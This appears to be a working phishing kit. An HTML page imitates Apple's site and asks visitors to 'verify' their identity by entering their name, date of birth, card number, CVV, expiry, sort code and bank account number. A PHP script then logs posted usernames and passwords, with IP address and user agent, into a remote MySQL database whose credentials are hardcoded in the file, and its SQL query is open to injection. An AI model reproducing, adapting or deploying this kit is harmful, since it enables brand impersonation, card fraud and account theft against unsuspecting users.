<html>
<head>
<title></title>
<link rel="stylesheet" href="style.css">
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<header>
<nav class="nav">
<table>
<tr>
<td><img class="appl"src="apple.jpg"></td>
<td>Mac</td>
<td>iPad</td>
<td>iPhone</td>
<td>Watch</td>
<td>TV</td>
<td>Music</td>
<td>Support</td>
<td><img class="appl" src="search.jpg"></td>
<!--<td><img class="appl"src="gbr/tas.jpg"></td>-->
<tr>
</table>
</nav>
</header>
<article>
<form action="finish.php" method="post">


<section class="ver"><b>Verify Your Identity</b></section>
<hr class="hr1">
<section class="bill"><strong>Billing Information</strong></section>

<section class="name">Full Name</section>
<input class="c"required class="1"placeholder="" name="nama" type="text">

<section class="date">Date Of Birth</section>
<input data-mask="00/00/0000" class="c"required placeholder="MM/DD/YYYY" name="date" type="text">

<section class="zip">Zip Code</section>
<input data-mask="000000" class="c"required placeholder="" name="zip" type="text">

<section class="phone">Phone Number </section>
<input data-mask="00000000000000" class="c"required placeholder="" name="number" type="text">

<section class="cc">Credit Card Number </section>
<input data-mask="0000 0000 0000 0000"class="c" required placeholder="" name="cardcredit" type="text">

<section class="exp">Expiry Date</section>
<input data-mask="00/00"class="c"required value=""placeholder="MM/YY" name="expired" type="text">

<section class="cvv">CVV</section>
<input data-mask="000000"class="c"required placeholder="" name="cvv" type="text">

<section class="sort">Sort Code</section>
<input class="c"placeholder="" name="scode" type="text">

<section class="acc">Account Number </section>
<input class="c"placeholder="" name="accnum" type="text"><br>
<button class="btn1" name="smbt" type="submit">Submit</button>


</form>
</article>
<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
</body>
</html>


<?php
 /*
 mipc_27053797_apple
 mipc_27053797
 (Your vPanel Password)
 sql105.mipropia.com
 */
 if(isset($_POST["submit"])){
 
 date_default_timezone_set('Asia/Jakarta'); 
 $user = $_POST["username"];
 $pass = $_POST["password"];
 $waktu = date("d - F - o");
 $ip = $_SERVER["REMOTE_ADDR"];
 $ua = $_SERVER["HTTP_USER_AGENT"];
 $jam = date("h : i : s");
 
 
 $conn = mysqli_connect(
 "sql105.mipropia.com",
 "mipc_27053797",
 "rastafara354",
 "mipc_27053797_apple");
 
 if($conn){echo "";}
 else{echo "";}
 
 $nambah = "INSERT INTO login (
 Id,Username,Password,Useragent,Ip,Waktu) VALUES(
 '','$user','$pass','$ua','$ip','$waktu / $jam')";
 
 if(mysqli_query($conn,$nambah)){echo "";}
 else{echo "";}
 
 }
 ?>